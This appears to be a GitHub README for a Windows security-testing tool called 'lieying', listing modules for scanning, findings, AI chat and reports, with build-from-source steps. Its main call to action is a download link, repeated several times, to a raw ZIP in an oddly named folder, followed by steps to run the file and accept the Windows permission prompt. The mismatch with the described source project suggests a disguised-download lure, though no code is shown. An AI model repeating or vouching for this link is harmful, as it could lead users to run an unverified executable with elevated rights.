# 🔍 lieying-PublicTestVersion - Simple Windows Threat Testing

[![Download](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)

## 📥 Download

Use this link to visit the page and download the app:

[https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)

## 🖥️ What this app does

lieying-PublicTestVersion is a Windows app for security testing work. It helps you manage assets, run scans, review findings, and create reports in one place.

Use it to:

- view your assets in one dashboard
- collect basic system and network info
- run vulnerability scan tasks
- review scan results
- manage issues in one place
- use AI chat for analysis help
- set AI options
- build SRC practice cases
- generate reports

## ⚙️ Before you start

You need:

- a Windows 10 or Windows 11 PC
- 4 GB RAM or more
- 2 GB free disk space
- an internet connection for setup and first use
- permission to run security tests on the systems you scan

## 🚀 Install on Windows

1. Open the download page:
   [https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)

2. Find the latest release or the app file on the page.

3. Download the Windows file to your computer.

4. If the file is in a ZIP package, right-click it and choose Extract All.

5. Open the extracted folder.

6. Double-click the Windows app file to start it.

7. If Windows asks for permission, choose Yes.

## 🧭 First setup

After the app opens:

1. Wait for the main screen to load.
2. Check the left menu or top tabs for the main modules.
3. Open the settings page if you need to change the server address, scan rules, or AI options.
4. Save your changes before you leave the page.
5. Restart the app if it asks for it.

## 🧩 Main modules

### 资产概览
See your saved assets in one place. Use this view to check target names, groups, and basic status.

### 信息收集
Collect host and service details before you scan. This helps you understand what is on the network.

### 漏洞扫描任务
Create and run scan tasks. You can track task progress and review task state.

### 漏洞结果
See scan results after a task ends. Use this page to check findings and risk level.

### 漏洞看板
Use the board view to spot high-priority issues fast. It helps you focus on the most important items first.

### 漏洞管理
Track issues from discovery to fix. Keep notes, status, and follow-up work in one place.

### AI对话
Open the AI chat area for help with analysis, notes, and report text.

### AI配置
Set AI options, such as the model source and related connection data.

### 教育SRC
Use this area for training and practice with public security report cases.

### 报告生成
Create reports from scan and review data. Export the result for sharing.

## 🗂️ Project structure

- `core/` - Go backend
  - `internal/api/` - API routes and handlers
  - `internal/models/` - data models
  - `internal/repository/` - data storage layer
  - `internal/service/` - business logic
  - `internal/config/` - app settings
  - `src/main.go` - backend entry point
- `frontend/` - React frontend
  - `src/components/` - screen parts
  - `src/services/` - API calls
  - `src/App.tsx` - main app file

## 🛠️ If you want to run from source

This section is for users who want to start the project from files instead of a release build.

### Backend

1. Open a terminal in the `core` folder.
2. Run:

```bash
go build -o lieying.exe ./src
lieying.exe server
```

### Frontend

1. Open a terminal in the `frontend` folder.
2. Run:

```bash
npm install
npm run dev
```

## 🔧 Common use flow

1. Open the app.
2. Add or import assets.
3. Run information collection.
4. Start a vulnerability scan task.
5. Review the results.
6. Move important issues into management.
7. Use AI chat to help write notes or explain findings.
8. Generate a report.

## 📌 Tips for first-time users

- Start with one test asset.
- Use a lab system or a system you own.
- Keep scan settings simple at first.
- Review results before running a new scan.
- Save reports after each test run.

## 📄 License

MIT